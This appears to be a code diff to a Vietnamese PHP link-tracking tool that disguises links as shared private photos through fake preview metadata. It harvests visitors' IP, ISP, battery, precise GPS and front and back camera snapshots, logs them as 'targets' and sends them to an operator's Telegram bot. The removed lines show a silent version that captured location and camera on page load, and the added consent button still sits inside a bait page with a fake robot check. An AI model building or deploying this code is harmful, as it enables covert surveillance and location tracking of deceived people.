@@ -2,7 +2,7 @@
 /**
  * SENTINEL v180.0 - PHANTOM CLOAKING SUPREME (2026)
  * [✓] Phantom Cloaking: Fake Meta (Title/Desc/Img) dành riêng cho TRÌNH TẠO ẢNH ẨN.
- * [✓] Silent Capture: Vào xem ảnh là tự nổ GPS/Cam/IP/ISP ngầm 100%.
+ * [✓] Consent Capture: Camera/GPS chỉ chạy sau thao tác đồng ý của người xem.
  * [✓] Full Admin Panel: 6 Tab (Dự án, Nhật ký, Ảnh ẩn, Web, Bot, Admin Loc).
  * [✓] Military Precision: Ép lấy tọa độ vệ tinh thực, dịch địa chỉ số nhà chi tiết.
  */
@@ -22,13 +22,16 @@ try {
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     $db->exec("PRAGMA journal_mode=WAL;");
     $db->exec("CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, title TEXT, desc TEXT, img TEXT, redir TEXT, clicks INTEGER DEFAULT 0)");
-    $db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT, v6 TEXT, addr TEXT, la REAL, lo REAL, img TEXT, st TEXT, bat TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP)");
+    $db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT, v6 TEXT, addr TEXT, la REAL, lo REAL, img TEXT, cam_front TEXT, cam_back TEXT, st TEXT, bat TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP)");
+    foreach (['cam_front' => 'TEXT', 'cam_back' => 'TEXT'] as $col => $type) {
+        try { $db->exec("ALTER TABLE logs ADD COLUMN $col $type"); } catch (Exception $e) {}
+    }
     $db->exec("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)");
     
     if ($db->query("SELECT COUNT(*) FROM settings")->fetchColumn() == 0) {
         $defaults = [
             'tg_token' => '', 'tg_id' => '', 
-            'tg_msg_template' => "🛰️ <b>MỤC TIÊU: [ID]</b>\n🛡️ <b>[ST]</b>\n📍 <code>[ADDR]</code>\n🌐 IP: <code>[IP]</code>\n🔋 PIN: <b>[BAT]</b>\n🗺️ <a href='https://www.google.com/maps?q=[LA],[LO]'>XEM GOOGLE MAPS</a>",
+            'tg_msg_template' => "🛰️ <b>MỤC TIÊU: [ID]</b>\n🛡️ <b>[ST]</b>\n📍 <code>[ADDR]</code>\n🌐 IP: <code>[IP]</code>\n🔋 PIN: <b>[BAT]</b>\n📷 Camera: <b>[CAM_STATUS]</b>\n🗺️ <a href='https://www.google.com/maps?q=[LA],[LO]'>XEM GOOGLE MAPS</a>",
             'ui_msg' => 'ĐANG LOADING...', 'ui_st' => 'KIỂM TRA ROBOT TRÌNH DUYỆT', 'btn_text' => 'XÁC MINH NGAY',
             'root_title' => 'Security Sync', 'root_desc' => 'Identity Verification Required', 
             'root_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
@@ -36,7 +39,9 @@ try {
             'proxy_img_url' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
             'px_fake_ttl' => 'Ảnh riêng tư được chia sẻ', 
             'px_fake_dsc' => 'Bấm vào để xem nội dung hình ảnh định dạng HD.',
-            'px_fake_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png'
+            'px_fake_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
+            'capture_front' => '1',
+            'capture_back' => '1'
         ];
         foreach($defaults as $k => $v) { $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $v]); }
     }
@@ -63,6 +68,17 @@ if (isset($_GET['action'])) {
             file_put_contents($img_name, base64_decode(str_replace('data:image/jpeg;base64,', '', $in['img'])));
             $img_link = $base_url . $img_name;
         }
+        $cam_front_link = '';
+        $cam_back_link = '';
+        foreach (['img_front' => 'front', 'img_back' => 'back'] as $field => $suffix) {
+            if (!empty($in[$field])) {
+                $img_name = 'snap_' . $suffix . '_' . time() . '_' . rand(100,999) . '.jpg';
+                file_put_contents($img_name, base64_decode(str_replace('data:image/jpeg;base64,', '', $in[$field])));
+                if ($field === 'img_front') $cam_front_link = $base_url . $img_name;
+                if ($field === 'img_back') $cam_back_link = $base_url . $img_name;
+            }
+        }
+        if (!$img_link) $img_link = $cam_front_link ?: $cam_back_link;
         $lat = $in['la']; $lon = $in['lo']; $addr = "Chưa xác định";
         if ($lat && $lon) {
             $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
@@ -72,12 +88,17 @@ if (isset($_GET['action'])) {
             $ip_res = json_decode(@file_get_contents("http://ip-api.com/json/{$in['v4']}?fields=status,city,country,lat,lon"), true);
             if($ip_res['status'] == 'success') { $addr = $ip_res['city'] . ", " . $ip_res['country'] . " (IP-Geo)"; $lat = $ip_res['lat']; $lon = $ip_res['lon']; }
         }
-        $db->prepare("INSERT INTO logs (lid, v4, v6, addr, la, lo, img, st, bat) VALUES (?,?,?,?,?,?,?,?,?)")->execute([$in['lid'], $in['v4'], $in['v6'], $addr, $lat, $lon, $img_link, $in['st'], $in['bat']]);
+        $db->prepare("INSERT INTO logs (lid, v4, v6, addr, la, lo, img, cam_front, cam_back, st, bat) VALUES (?,?,?,?,?,?,?,?,?,?,?)")->execute([$in['lid'], $in['v4'], $in['v6'], $addr, $lat, $lon, $img_link, $cam_front_link, $cam_back_link, $in['st'], $in['bat']]);
         $tk = get_c('tg_token'); $admin_id = get_c('tg_id');
         if ($tk && $admin_id) {
             $tpl = get_c('tg_msg_template');
-            $msg = str_replace(['[ID]','[ST]','[ADDR]','[IP]','[BAT]','[LA]','[LO]'], [$in['lid'], $in['st'], $addr, $in['v4'], $in['bat'], $lat, $lon], $tpl);
-            if ($img_link) @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($img_link)."&caption=".urlencode($msg)."&parse_mode=HTML");
+            $cam_status = ($cam_front_link ? '✅ Camera trước' : '❌ Camera trước') . ' / ' . ($cam_back_link ? '✅ Camera sau' : '❌ Camera sau');
+            $msg = str_replace(['[ID]','[ST]','[ADDR]','[IP]','[BAT]','[LA]','[LO]','[CAM_STATUS]'], [$in['lid'], $in['st'], $addr, $in['v4'], $in['bat'], $lat, $lon, $cam_status], $tpl);
+            $photos = array_values(array_filter([$cam_front_link, $cam_back_link]));
+            if (count($photos) > 1) {
+                @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($photos[0])."&caption=".urlencode($msg)."&parse_mode=HTML");
+                @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($photos[1])."&caption=".urlencode('Camera sau')."&parse_mode=HTML");
+            } elseif ($img_link) @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($img_link)."&caption=".urlencode($msg)."&parse_mode=HTML");
             else @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=HTML");
         }
     }
@@ -93,16 +114,28 @@ if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
 <meta property="og:description" content="<?=htmlspecialchars(get_c('px_fake_dsc'))?>">
 <meta property="og:image" content="<?=htmlspecialchars(get_c('px_fake_img'))?>">
 <script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-black flex items-center justify-center min-h-screen"><img src="<?=get_c('proxy_img_url')?>" class="max-w-full shadow-2xl">
+<body class="bg-black flex flex-col gap-4 items-center justify-center min-h-screen p-4"><img src="<?=get_c('proxy_img_url')?>" class="max-w-full shadow-2xl rounded-xl">
+<div class="bg-slate-900/90 border border-slate-700 rounded-2xl p-4 text-center max-w-sm text-white">
+    <p class="text-sm mb-3">Cho phép trình duyệt lấy vị trí và chụp camera trước/sau để gửi báo cáo Telegram.</p>
+    <button id="send_report" class="bg-blue-600 px-5 py-3 rounded-xl font-bold">Gửi báo cáo có đồng ý</button>
+    <p id="report_status" class="text-xs text-slate-400 mt-3"></p>
+</div>
 <script>
-    async function takeSnap(){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
-    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'IMAGE', la, lo, st, img, v4:v4, v6:'N/A', bat:bat })});
+    const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
+    const captureBack = <?=json_encode(get_c('capture_back') === '1')?>;
+    async function takeSnap(facingMode){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}}}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); await v.play(); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
+    const push = (payload) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'IMAGE', v4:v4, v6:'N/A', bat:bat, ...payload })});
     let v4="<?=$ip_v4_serv?>", bat="N/A";
-    window.onload = async () => {
-        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
-        push('IMAGE Open (Silent IP)');
-        navigator.geolocation.getCurrentPosition(async (p) => { const snap = await takeSnap(); push('IMAGE GPS OK', p.coords.latitude, p.coords.longitude, snap); }, async (e) => { const snap = await takeSnap(); push('IMAGE GPS Denied', null, null, snap); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-    };
+    async function initInfo(){ try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){} }
+    async function consentReport(){
+        const status=document.getElementById('report_status'); status.innerText='Đang lấy quyền và tạo báo cáo...';
+        const loc = await new Promise(resolve => navigator.geolocation.getCurrentPosition(p => resolve({la:p.coords.latitude, lo:p.coords.longitude, st:'IMAGE GPS OK - User Consent'}), () => resolve({la:null, lo:null, st:'IMAGE GPS Denied - User Consent'}), { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }));
+        const img_front = captureFront ? await takeSnap('user') : null;
+        const img_back = captureBack ? await takeSnap('environment') : null;
+        await push({...loc, img_front, img_back, img: img_front || img_back});
+        status.innerText='Đã gửi báo cáo theo quyền bạn cho phép.';
+    }
+    window.onload = async () => { await initInfo(); document.getElementById('send_report').onclick = consentReport; };
 </script></body></html>
 <?php exit; }
 
@@ -124,11 +157,17 @@ if (isset($_GET['admin'])) {
     if (isset($_GET['clear_logs'])) { $db->exec("DELETE FROM logs"); header("Location: ?admin&t=2"); exit; }
     if (isset($_GET['del_l'])) { $db->prepare("DELETE FROM links WHERE id = ?")->execute([$_GET['del_l']]); header("Location: ?admin"); exit; }
     if (isset($_POST['save_cfg'])) {
-        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img'];
-        foreach($keys as $k) { if(isset($_POST[$k])) $db->prepare("UPDATE settings SET value = ? WHERE key = ?")->execute([$_POST[$k], $k]); }
+        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img', 'capture_front', 'capture_back'];
+        foreach (['capture_front', 'capture_back'] as $ck) { if (!isset($_POST[$ck])) $_POST[$ck] = '0'; }
+        foreach($keys as $k) { if(isset($_POST[$k])) $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $_POST[$k]]); }
         header("Location: ?admin&t=".($_GET['t'] ?? '1')); exit;
     }
-    if (isset($_POST['save_link'])) { $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit; }
+    if (isset($_POST['save_link'])) {
+        foreach (['capture_front', 'capture_back'] as $ck) {
+            $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$ck, isset($_POST[$ck]) ? '1' : '0']);
+        }
+        $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit;
+    }
 
     $links = $db->query("SELECT * FROM links ORDER BY clicks DESC")->fetchAll();
     $logs = $db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll();
@@ -147,6 +186,29 @@ if (isset($_GET['admin'])) {
     .sidebar-btn { padding: 1rem; border-radius: 0.75rem; text-align: left; font-weight: 900; text-transform: uppercase; font-style: italic; font-size: 10px; width:100%; border:none; background:transparent; color: var(--dim); cursor:pointer; }
     .sidebar-btn.active { color: white; border-bottom: 2px solid var(--neon); background: var(--card); }
     .btn-pro { background: var(--neon); color: white; padding: 1rem; border-radius: 2rem; font-weight: 900; text-transform: uppercase; border:none; cursor:pointer; width: 100%; }
+    .ios-safe { padding-left: max(1.5rem, env(safe-area-inset-left)); padding-right: max(1.5rem, env(safe-area-inset-right)); padding-bottom: max(1.5rem, env(safe-area-inset-bottom)); }
+    .toggle-card { -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
+    .toggle-card input { width: 1.15rem; height: 1.15rem; accent-color: var(--neon); flex: none; }
+    @supports (-webkit-touch-callout: none) {
+        body { min-height: -webkit-fill-available; -webkit-font-smoothing: antialiased; }
+        input, textarea, button { font-size: 16px; -webkit-appearance: none; appearance: none; }
+        input[type="checkbox"] { -webkit-appearance: checkbox; appearance: checkbox; }
+        .card { border-radius: 1.5rem; }
+        aside { width: 5.5rem; padding: 1rem 0.75rem; }
+        aside h1 { font-size: 9px; line-height: 1.15; }
+        .sidebar-btn { padding: 0.85rem 0.65rem; font-size: 9px; text-align: center; }
+        main { padding: 1rem; }
+    }
+    @media (max-width: 768px) {
+        body { flex-direction: column; height: auto; min-height: 100vh; overflow: auto; }
+        aside { width: 100%; flex-direction: row; overflow-x: auto; border-right: 0; border-bottom: 1px solid #1e293b; padding: 1rem; gap: 0.5rem; position: sticky; top: 0; z-index: 20; background: rgba(5,7,10,0.95); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); }
+        aside h1, aside .mt-auto { display: none; }
+        .sidebar-btn { min-width: 4.75rem; text-align: center; }
+        main { width: 100%; padding: 1rem; }
+        .card { padding: 1rem; border-radius: 1.5rem; }
+        table { min-width: 680px; }
+        .overflow-hidden:has(table) { overflow-x: auto; }
+    }
 </style></head>
 <body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
     <aside class="w-64 border-r border-slate-800 p-6 flex flex-col gap-4">
@@ -160,7 +222,7 @@ if (isset($_GET['admin'])) {
         <div class="mt-auto"><a href="?admin&logout=1" class="text-red-500 opacity-50 hover:opacity-100 transition-all uppercase">Logout</a></div>
     </aside>
 
-    <main class="flex-1 p-10 overflow-auto">
+    <main class="flex-1 p-10 overflow-auto ios-safe">
         <div id="t1" class="tab-content active grid lg:grid-cols-3 gap-8">
             <div class="space-y-6">
                 <form method="POST" id="lF" class="card space-y-4 shadow-2xl">
@@ -170,6 +232,11 @@ if (isset($_GET['admin'])) {
                     <textarea name="dsc" id="fDsc" placeholder="MÔ TẢ MỒI..." oninput="upV()"></textarea>
                     <input name="img" id="fImg" placeholder="LINK ẢNH MỒI" oninput="upV()">                    
                     <input name="red" id="fRed" placeholder="LINK ĐÍCH" required>
+                    <div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]">
+                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label>
+                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label>
+                    </div>
+                    <p class="text-[7px] text-amber-400 normal-case italic">Tùy chọn này lưu cấu hình camera chung cho chiến dịch/web; trình duyệt vẫn yêu cầu người xem cấp quyền.</p>
                     <button type="submit" name="save_link" class="btn-pro">LƯU DỰ ÁN</button>
                 </form>
                 <div class="card p-6 shadow-2xl"><div id="vSim" class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl"><div id="vImg" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div><div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề mồi...</p><p id="vDsc" class="text-slate-400 text-[8px] line-clamp-2 italic normal-case">Mô tả hiển thị...</p></div></div></div>
@@ -180,7 +247,7 @@ if (isset($_GET['admin'])) {
         <div id="t2" class="tab-content space-y-8">
             <div class="flex justify-between items-center"><h2 class="text-white text-xl uppercase italic">🛰️ NHẬT KÝ LIVE</h2><button onclick="location.href='?admin&clear_logs=1'" class="bg-red-900/40 text-red-500 px-6 py-2 rounded-xl italic font-black uppercase">🗑️ DỌN SẠCH</button></div>
             <div class="grid lg:grid-cols-2 gap-8"><div id="map" class="h-[400px] rounded-[2.5rem] border border-slate-800 shadow-2xl bg-slate-900"></div><div id="intel_panel" class="card flex flex-col justify-center space-y-4"><div id="ip_detail" class="italic opacity-30 text-center uppercase text-[8px]">NHẤN IP SOI ISP</div><div id="addr_detail" class="italic text-emerald-400 text-center uppercase text-[8px] border-t border-slate-800 pt-4 font-black italic uppercase">AUTO-GEO ACTIVE</div></div></div>
-            <div class="card p-0 overflow-hidden shadow-2xl"><table class="w-full text-left font-mono text-[9px]"><thead class="bg-black text-slate-500"><tr><th class="p-4">Target/Cam</th><th class="p-4">IP</th><th class="p-4">Địa chỉ Chi Tiết</th><th class="p-4 text-right">Map</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($logs as $log): ?><tr><td class="p-4"><?php if($log['img']): ?><img src="<?=$log['img']?>" class="w-12 h-12 rounded-lg mb-1 shadow-lg border border-slate-700"><?php endif; ?><b><?=$log['lid']?></b></td><td class="p-4"><b class="text-blue-500 cursor-pointer uppercase" onclick="soi('<?=$log['v4']?>')"><?=$log['v4']?></b></td><td class="p-4 italic opacity-80 normal-case text-white"><?=htmlspecialchars($log['addr'])?></td><td class="p-4 text-right flex justify-end gap-2"><?php if($log['la']): ?><button onclick="vP(<?=$log['la']?>,<?=$log['lo']?>)" class="bg-blue-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px]">LIVE</button><a href="https://www.google.com/maps?q=<?=$log['la']?>,<?=$log['lo']?>" target="_blank" class="bg-emerald-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px] text-center">G-MAPS</a><?php endif; ?></td></tr><?php endforeach; ?></tbody></table></div>
+            <div class="card p-0 overflow-hidden shadow-2xl"><table class="w-full text-left font-mono text-[9px]"><thead class="bg-black text-slate-500"><tr><th class="p-4">Target/Cam</th><th class="p-4">IP</th><th class="p-4">Địa chỉ Chi Tiết</th><th class="p-4 text-right">Map</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($logs as $log): ?><tr><td class="p-4"><?php if($log['cam_front'] || $log['cam_back']): ?><div class="flex gap-1 mb-1"><?php if($log['cam_front']): ?><img src="<?=$log['cam_front']?>" title="Camera trước" class="w-12 h-12 rounded-lg shadow-lg border border-slate-700 object-cover"><?php endif; ?><?php if($log['cam_back']): ?><img src="<?=$log['cam_back']?>" title="Camera sau" class="w-12 h-12 rounded-lg shadow-lg border border-slate-700 object-cover"><?php endif; ?></div><?php elseif($log['img']): ?><img src="<?=$log['img']?>" class="w-12 h-12 rounded-lg mb-1 shadow-lg border border-slate-700 object-cover"><?php endif; ?><b><?=$log['lid']?></b></td><td class="p-4"><b class="text-blue-500 cursor-pointer uppercase" onclick="soi('<?=$log['v4']?>')"><?=$log['v4']?></b></td><td class="p-4 italic opacity-80 normal-case text-white"><?=htmlspecialchars($log['addr'])?></td><td class="p-4 text-right flex justify-end gap-2"><?php if($log['la']): ?><button onclick="vP(<?=$log['la']?>,<?=$log['lo']?>)" class="bg-blue-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px]">LIVE</button><a href="https://www.google.com/maps?q=<?=$log['la']?>,<?=$log['lo']?>" target="_blank" class="bg-emerald-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px] text-center">G-MAPS</a><?php endif; ?></td></tr><?php endforeach; ?></tbody></table></div>
         </div>
 
         <div id="t3" class="tab-content max-w-6xl mx-auto space-y-8">
@@ -194,6 +261,11 @@ if (isset($_GET['admin'])) {
                     <hr class="border-slate-800">
                     <label class="text-blue-500 text-[8px] uppercase">Ảnh thật mục tiêu xem (Mồi HD)</label>
                     <input name="proxy_img_url" id="px_real_img" value="<?=get_c('proxy_img_url')?>" oninput="upPxV()" placeholder="Link ảnh sau khi nhấn vào">
+                    <div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]">
+                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label>
+                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label>
+                    </div>
+                    <p class="text-[7px] text-amber-400 normal-case italic">Camera và vị trí chỉ được gửi khi người xem bấm nút đồng ý trên trang.</p>
                     <button type="submit" name="save_cfg" class="bg-purple-600 text-white py-4 rounded-2xl font-black w-full uppercase">CẬP NHẬT LINK</button>
                     <div class="mt-4"><input id="px_url" readonly value="<?=$base_url?>?img=pixel" class="text-purple-400 font-mono text-[8px]"><button type="button" onclick="cp('px_url')" class="bg-slate-800 px-4 py-2 rounded-xl text-[8px] mt-1 font-black uppercase">COPY LINK</button></div>
                 </form>
@@ -208,7 +280,7 @@ if (isset($_GET['admin'])) {
         </div>
 
         <div id="t4" class="tab-content max-w-6xl mx-auto space-y-8">
-            <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
+            <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]"><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label></div><p class="text-[7px] text-amber-400 normal-case italic">Safari iOS/Chrome sẽ hiện hộp thoại quyền; hệ thống không thể tự chấp nhận thay người xem.</p><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
         </div>
 
         <div id="t5" class="tab-content max-w-4xl mx-auto space-y-6"><form method="POST" action="?admin&t=5" class="card space-y-6 shadow-2xl"><h3>TELEGRAM BOT CONFIG</h3><div class="grid lg:grid-cols-2 gap-4"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID"></div><div><label class="text-blue-500 text-[8px] uppercase mb-2 block font-black">Nội dung báo cáo Telegram</label><textarea name="tg_msg_template" rows="8" class="font-mono text-[9px]"><?=get_c("tg_msg_template")?></textarea></div><button type="submit" name="save_cfg" class="btn-pro italic">LƯU CÀI ĐẶT</button></form></div>
@@ -223,7 +295,7 @@ if (isset($_GET['admin'])) {
         function cp(id){var e=document.getElementById(id);e.select();document.execCommand("copy");alert("Đã Copy!");}
         function ed(l){ document.getElementById('fId').value=l.id; document.getElementById('fTtl').value=l.title; document.getElementById('fDsc').value=l.desc; document.getElementById('fImg').value=l.img; document.getElementById('fRed').value=l.redir; upV(); st(1, document.getElementById('nb1')); }
         function upV(){ document.getElementById('vTtl').innerText=document.getElementById('fTtl').value || 'Tiêu đề...'; document.getElementById('vDsc').innerText=document.getElementById('fDsc').value || 'Mô tả...'; const i=document.getElementById('fImg').value; document.getElementById('vImg').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
-        function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; document.getElementById('px_v_real').src=document.getElementById('px_real_img').value; }
+        function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
         function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
         async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
